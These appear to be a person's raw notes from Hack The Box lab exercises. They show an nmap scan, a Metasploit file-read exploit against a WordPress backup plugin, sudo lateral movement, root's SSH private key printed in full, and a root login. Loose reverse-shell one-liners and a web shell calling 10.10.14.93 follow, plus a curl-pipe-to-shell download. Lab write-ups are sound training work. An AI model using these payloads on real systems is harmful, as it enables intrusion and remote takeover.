

# nmap, required -Pn because was not responding to pings

└─$ nmap -sC -sV 83.136.252.24 -Pn  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 18:41 AEST
Nmap scan report for 83-136-252-24.uk-lon1.upcloud.host (83.136.252.24)
Host is up (0.32s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION

22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 cd:cd:55:c0:fe:dd:01:b5:17:81:fb:7d:b0:cc:d1:c0 (RSA)
|   256 42:a1:b8:83:1e:a8:d7:0a:f9:c6:c4:40:2a:6b:4c:fe (ECDSA)
|_  256 3a:59:d7:5a:3e:0f:06:a2:92:fe:52:19:b4:14:e4:1b (ED25519)

32778/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Recommended Modules
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.97 seconds


searchsploit Simple Backup Plugin 2.7.1 

msfconsole
use auxiliary/scanner/http/wp_simple_backup_file_read
options
set RHOSTS 83.136.252.24
set RPORT 43765
set FILEPATH /flag.txt
exploit


[+] File saved in: /home/dbcyph0n/.msf4/loot/20230911190502_default_83.136.252.24_simplebackup.tra_071136.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


└─$ cat /home/dbcyph0n/.msf4/loot/20230911190502_default_83.136.252.24_simplebackup.tra_071136.txt
HTB{my_f1r57_h4ck}


---
# Privilege Escalation

```sh
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ cd /home
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home$ ls
user1  user2
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home$ cd user2
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ ls
flag.txt
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ cat flag.txt
cat: flag.txt: Permission denied
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ ls -la
total 16
drwxr-xr-x 1 user2 user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root  root  4096 Feb 12  2021 ..
-rw------- 1 user2 user2   38 Feb 12  2021 flag.txt
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ sudo -l
Matching Defaults entries for user1 on ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:
    (user2 : user2) NOPASSWD: /bin/bash
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ su -u user2 /bin/bash
Try 'su --help' for more information.
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ sudo -u user2 /bin/bash
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ ls
flag.txt
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ cat flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ ls -la
total 16
drwxr-xr-x 1 user2 user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root  root  4096 Feb 12  2021 ..
-rw------- 1 user2 user2   38 Feb 12  2021 flag.txt
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ whoami
user2
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ cd /root/.ssh
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ ls -la
total 20
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-x--- 1 root user2 4096 Feb 12  2021 ..
-rw------- 1 root root   571 Feb 12  2021 authorized_keys
-rw-r--r-- 1 root root  2602 Feb 12  2021 id_rsa
-rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ 
```

```sh

┌──(dbcyph0n㉿kali)-[~/htb]
└─$ nano id_rsa                   
                                                                                                                    
┌──(dbcyph0n㉿kali)-[~/htb]
└─$ chmod 600 id_rsa 
                                                                                                                    
┌──(dbcyph0n㉿kali)-[~/htb]
└─$ ssh root@94.237.59.206 -p 57855 -i id_rsa 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~# ls 
flag.txt
root@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~# cat flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
root@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~# 

```




<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.93/9005 0>&1'"); ?>


bash -c 'bash -i >& /dev/tcp/10.10.14.93/9001 0>&1




curl -L http://10.10.14.93/linpeas.sh | sh

sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.93",9006);exec("/bin/sh -i <&3 >&3 2>&3");'